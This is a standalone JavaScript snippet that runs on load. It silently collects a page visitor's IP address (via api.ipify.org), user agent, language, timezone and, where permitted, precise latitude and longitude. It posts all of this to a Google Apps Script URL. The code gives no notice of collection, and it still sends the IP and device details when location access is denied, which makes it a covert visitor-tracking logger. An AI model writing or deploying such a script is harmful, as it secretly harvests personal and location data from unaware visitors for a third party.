const getUserDetails = async () => {
    let Data = {
        ip: '',
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        latitude: '',
        longitude: ''
    };

    try {
        const location = await fetch("https://api.ipify.org?format=json");
        const locationData = await location.json();
        Data.ip = locationData.ip;
    } catch (err) {
        console.error("Failed to fetch IP:", err);
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function (position) {
                Data.latitude = position.coords.latitude || '';
                Data.longitude = position.coords.longitude || '';
                submitData(Data);
            },
            function (error) {
                console.error("Error getting location", error);
                submitData(Data);
            }
        );
    } else {
        submitData(Data); // browser doesn't support location
    }
};

function submitData(data) {
    fetch("https://script.google.com/macros/s/AKfycbyxbcusJv3zYgkHAhDq30VSAKfzc90JubW_h28BVCa70xagx3fXLthODD8_gewlfpY/exec", {
        method: "POST",
        redirect: "follow",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    })
        .then(res => res.text())
        .then(console.log)
        .catch(console.error);
}

getUserDetails();
